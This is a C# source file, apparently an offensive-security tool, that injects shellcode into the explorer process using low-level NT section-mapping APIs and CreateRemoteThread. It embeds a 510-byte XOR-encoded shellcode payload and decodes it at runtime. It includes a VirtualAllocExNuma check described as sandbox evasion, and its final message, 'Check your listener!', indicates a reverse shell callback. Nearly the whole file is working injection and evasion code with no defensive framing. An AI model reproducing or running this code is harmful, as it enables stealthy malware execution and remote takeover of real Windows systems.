using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace RemoteShinjectLowlevel
{
    class Program
    {
        // FOR DEBUGGING
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        static extern int memcmp(byte[] b1, byte[] b2, long count);

        static bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }
        // END DEBUGGING

        public const uint ProcessAllFlags = 0x001F0FFF;
        public const uint GenericAll = 0x10000000;
        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;
        public const uint PageReadWriteExecute = 0x40;
        public const uint SecCommit = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize,
            UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize,
            out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // Sandbox evasion
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
	    
	    // Shellcode
byte[] buf = new byte[510] {0x70, 0xc4, 0x0f, 0x68, 0x7c, 0x64, 0x40, 0x8c, 0x8c, 0x8c, 0xcd, 0xdd, 0xcd, 0xdc, 0xde, 0xc4, 0xbd, 0x5e, 0xe9, 0xc4, 0x07, 0xde, 0xec, 0xc4, 0x07, 0xde, 0x94, 0xc4, 0x07, 0xde, 0xac, 0xdd, 0xda, 0xc1, 0xbd, 0x45, 0xc4, 0x07, 0xfe, 0xdc, 0xc4, 0x83, 0x3b, 0xc6, 0xc6, 0xc4, 0xbd, 0x4c, 0x20, 0xb0, 0xed, 0xf0, 0x8e, 0xa0, 0xac, 0xcd, 0x4d, 0x45, 0x81, 0xcd, 0x8d, 0x4d, 0x6e, 0x61, 0xde, 0xcd, 0xdd, 0xc4, 0x07, 0xde, 0xac, 0x07, 0xce, 0xb0, 0xc4, 0x8d, 0x5c, 0xea, 0x0d, 0xf4, 0x94, 0x87, 0x8e, 0x83, 0x09, 0xfe, 0x8c, 0x8c, 0x8c, 0x07, 0x0c, 0x04, 0x8c, 0x8c, 0x8c, 0xc4, 0x09, 0x4c, 0xf8, 0xeb, 0xc4, 0x8d, 0x5c, 0xdc, 0xc8, 0x07, 0xcc, 0xac, 0xc5, 0x8d, 0x5c, 0x07, 0xc4, 0x94, 0x6f, 0xda, 0xc1, 0xbd, 0x45, 0xc4, 0x73, 0x45, 0xcd, 0x07, 0xb8, 0x04, 0xc4, 0x8d, 0x5a, 0xc4, 0xbd, 0x4c, 0x20, 0xcd, 0x4d, 0x45, 0x81, 0xcd, 0x8d, 0x4d, 0xb4, 0x6c, 0xf9, 0x7d, 0xc0, 0x8f, 0xc0, 0xa8, 0x84, 0xc9, 0xb5, 0x5d, 0xf9, 0x54, 0xd4, 0xc8, 0x07, 0xcc, 0xa8, 0xc5, 0x8d, 0x5c, 0xea, 0xcd, 0x07, 0x80, 0xc4, 0xc8, 0x07, 0xcc, 0x90, 0xc5, 0x8d, 0x5c, 0xcd, 0x07, 0x88, 0x04, 0xc4, 0x8d, 0x5c, 0xcd, 0xd4, 0xcd, 0xd4, 0xd2, 0xd5, 0xd6, 0xcd, 0xd4, 0xcd, 0xd5, 0xcd, 0xd6, 0xc4, 0x0f, 0x60, 0xac, 0xcd, 0xde, 0x73, 0x6c, 0xd4, 0xcd, 0xd5, 0xd6, 0xc4, 0x07, 0x9e, 0x65, 0xc7, 0x73, 0x73, 0x73, 0xd1, 0xc5, 0x32, 0xfb, 0xff, 0xbe, 0xd3, 0xbf, 0xbe, 0x8c, 0x8c, 0xcd, 0xda, 0xc5, 0x05, 0x6a, 0xc4, 0x0d, 0x60, 0x2c, 0x8d, 0x8c, 0x8c, 0xc5, 0x05, 0x69, 0xc5, 0x30, 0x8e, 0x8c, 0x8d, 0x37, 0x4c, 0x24, 0xa1, 0x47, 0xcd, 0xd8, 0xc5, 0x05, 0x68, 0xc0, 0x05, 0x7d, 0xcd, 0x36, 0xc0, 0xfb, 0xaa, 0x8b, 0x73, 0x59, 0xc0, 0x05, 0x66, 0xe4, 0x8d, 0x8d, 0x8c, 0x8c, 0xd5, 0xcd, 0x36, 0xa5, 0x0c, 0xe7, 0x8c, 0x73, 0x59, 0xe6, 0x86, 0xcd, 0xd2, 0xdc, 0xdc, 0xc1, 0xbd, 0x45, 0xc1, 0xbd, 0x4c, 0xc4, 0x73, 0x4c, 0xc4, 0x05, 0x4e, 0xc4, 0x73, 0x4c, 0xc4, 0x05, 0x4d, 0xcd, 0x36, 0x66, 0x83, 0x53, 0x6c, 0x73, 0x59, 0xc4, 0x05, 0x4b, 0xe6, 0x9c, 0xcd, 0xd4, 0xc0, 0x05, 0x6e, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x15, 0x29, 0xf8, 0xed, 0x73, 0x59, 0x09, 0x4c, 0xf8, 0x86, 0xc5, 0x73, 0x42, 0xf9, 0x69, 0x64, 0x1f, 0x8c, 0x8c, 0x8c, 0xc4, 0x0f, 0x60, 0x9c, 0xc4, 0x05, 0x6e, 0xc1, 0xbd, 0x45, 0xe6, 0x88, 0xcd, 0xd4, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x8e, 0x55, 0x44, 0xd3, 0x73, 0x59, 0x0f, 0x74, 0x8c, 0xf2, 0xd9, 0xc4, 0x0f, 0x48, 0xac, 0xd2, 0x05, 0x7a, 0xe6, 0xcc, 0xcd, 0xd5, 0xe4, 0x8c, 0x9c, 0x8c, 0x8c, 0xcd, 0xd4, 0xc4, 0x05, 0x7e, 0xc4, 0xbd, 0x45, 0xcd, 0x36, 0xd4, 0x28, 0xdf, 0x69, 0x73, 0x59, 0xc4, 0x05, 0x4f, 0xc5, 0x05, 0x4b, 0xc1, 0xbd, 0x45, 0xc5, 0x05, 0x7c, 0xc4, 0x05, 0x56, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x8e, 0x55, 0x44, 0xd3, 0x73, 0x59, 0x0f, 0x74, 0x8c, 0xf1, 0xa4, 0xd4, 0xcd, 0xdb, 0xd5, 0xe4, 0x8c, 0xcc, 0x8c, 0x8c, 0xcd, 0xd4, 0xe6, 0x8c, 0xd6, 0xcd, 0x36, 0x87, 0xa3, 0x83, 0xbc, 0x73, 0x59, 0xdb, 0xd5, 0xcd, 0x36, 0xf9, 0xe2, 0xc1, 0xed, 0x73, 0x59, 0xc5, 0x73, 0x42, 0x65, 0xb0, 0x73, 0x73, 0x73, 0xc4, 0x8d, 0x4f, 0xc4, 0xa5, 0x4a, 0xc4, 0x09, 0x7a, 0xf9, 0x38, 0xcd, 0x73, 0x6b, 0xd4, 0xe6, 0x8c, 0xd5, 0xc5, 0x4b, 0x4e, 0x7c, 0x39, 0x2e, 0xda, 0x73, 0x59};
	    // End Shellcode


            // Decoding
// XOR decoding
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(buf[i] ^ 0x8c);
}
	    // End Decoding


            int len = buf.Length;
            uint uLen = (uint)len;

            // Get a handle on the local process
            IntPtr lHandle = Process.GetCurrentProcess().Handle;
            Console.WriteLine($"Got handle {lHandle} on local process.");

            // Grab the right PID
            string targetedProc = "explorer"; //change :)
            int procId = Process.GetProcessesByName(targetedProc).First().Id;

            // Get a handle on the remote process
            IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
            Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");

            // Create a RWX memory section with the size of the payload using 'NtCreateSection'
            IntPtr sHandle = new IntPtr();
            long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
            Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");

            // Map a view of the created section (sHandle) for the LOCAL process using 'NtMapViewOfSection'
            IntPtr baseAddrL = new IntPtr();
            uint viewSizeL = uLen;
            ulong sectionOffsetL = new ulong();
            long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);
            Console.WriteLine($"Mapped local memory section with base address {baseAddrL} (viewsize: {viewSizeL}, offset: {sectionOffsetL}). Success: {mStatusL == 0}.");

            // Map a view of the same section for the specified REMOTE process (pHandle) using 'NtMapViewOfSection'
            IntPtr baseAddrR = new IntPtr();
            uint viewSizeR = uLen;
            ulong sectionOffsetR = new ulong();
            long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);
            Console.WriteLine($"Mapped remote memory section with base address {baseAddrR} (viewsize: {viewSizeR}, offset: {sectionOffsetR}). Success: {mStatusR == 0}.");
	    //
            // Copy shellcode to locally mapped view, which will be reflected in the remote mapping
            Marshal.Copy(buf, 0, baseAddrL, len);
            Console.WriteLine($"Copied shellcode to locally mapped memory at address {baseAddrL}.");

            // DEBUG: Read memory at remote address and verify it's the same as the intended shellcode
            byte[] remoteMemory = new byte[len];
            IntPtr noBytesRead = new IntPtr();
            bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
            bool sameSame = ByteArrayCompare(buf, remoteMemory);
            Console.WriteLine($"DEBUG: Checking if shellcode is correctly placed remotely...");
            if (sameSame != true)
            {
                Console.WriteLine("DEBUG: NOT THE SAME! ABORTING EXECUTION.");
                return;
            }
            else
            {
                Console.WriteLine("DEBUG: OK.");
            }
            // END DEBUG

            // Execute the remotely mapped memory using 'CreateRemoteThread' (EWWW high-level APIs!!!)
            if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.WriteLine("Injection done! Check your listener!");
            }
            else
            {
                Console.WriteLine("Injection failed!");
            }

            // Unmap the locally mapped section view using 'NtUnMapViewOfSection'
            uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
            Console.WriteLine($"Unmapped local memory section. Success: {uStatusL == 0}.");

            // Close the section
            int clStatus = NtClose(sHandle);
            Console.WriteLine($"Closed memory section. Success: {clStatus == 0}.");
        }
    }
}
